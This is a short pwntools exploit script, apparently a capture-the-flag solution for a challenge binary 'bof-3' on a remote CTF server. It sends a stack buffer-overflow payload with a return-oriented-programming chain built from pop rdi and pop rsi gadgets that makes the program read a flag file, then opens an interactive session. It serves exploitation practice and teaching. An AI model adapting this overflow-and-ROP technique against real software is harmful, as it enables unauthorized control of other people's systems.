#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./bof-3", checksec=False)


def start(argv=[], *a, **kw):
    nc = "nc chals.fuzzy.land 5104"
    nc = nc.split()
    host = args.HOST or nc[1]
    port = int(args.PORT or nc[2])
    if args.REMOTE:
        return remote(host, port)
    else:
        args_ = [elf.path] + argv
        if args.NA:  # NOASLR
            args_ = ["setarch", "-R"] + args_
        return process(args_, env=env, *a, **kw)


env = {}
io = start()

pop_rdi = 0x00401433
pop_rsi = 0x00401268
ret = pop_rdi + 1

payload = b"A" * 0x40
payload += flat(
    elf.bss(0x800),
    pop_rdi, elf.sym["flag_path"],
    pop_rsi, 0x100,
    ret, elf.sym["head"],
)
io.sendline(payload)

io.interactive()
